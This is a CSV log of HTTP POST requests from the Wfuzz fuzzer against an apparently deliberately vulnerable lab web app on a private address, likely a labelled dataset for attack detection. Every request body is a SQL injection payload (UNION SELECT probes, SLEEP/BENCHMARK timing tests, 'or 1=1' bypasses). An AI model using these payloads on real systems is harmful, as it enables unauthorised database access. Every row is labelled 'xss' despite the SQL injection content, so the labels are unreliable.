attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
xss,192.168.1.3,80,"id=UNION ALL SELECT 1,2,3,4",*/*,27,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",close,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55178
xss,192.168.1.3,80,"id=UNION ALL SELECT 1,2,3,4,5,6",*/*,31,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",close,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55184
xss,192.168.1.3,80,"id=UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",*/*,88,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",close,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55200
xss,192.168.1.3,80,"id=UNION ALL SELECT USER(),SLEEP(5)--",*/*,37,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",close,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55214
xss,192.168.1.3,80,"id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",*/*,104,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",close,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55224
xss,192.168.1.3,80,"id=admin""/*",*/*,11,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55262
xss,192.168.1.3,80,"id=admin"" or ""1""=""1""--",*/*,22,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55234
xss,192.168.1.3,80,"id=admin"" or ""1""=""1""/*",*/*,22,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55250
xss,192.168.1.3,80,"id=admin"" or 1=1",*/*,16,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55258
xss,192.168.1.3,80,"id=admin"" or ""1""=""1""#",*/*,21,application/x-www-form-urlencoded,192.168.1.3,Wfuzz/3.1.0,POST,http://192.168.1.3/DVM/vulnerabilities/sqli/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.1.3 Port 80</address> </body></html> ",,273,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 12:04:02 GMT",404,Apache/2.4.52 (Ubuntu),192.168.1.4,55260
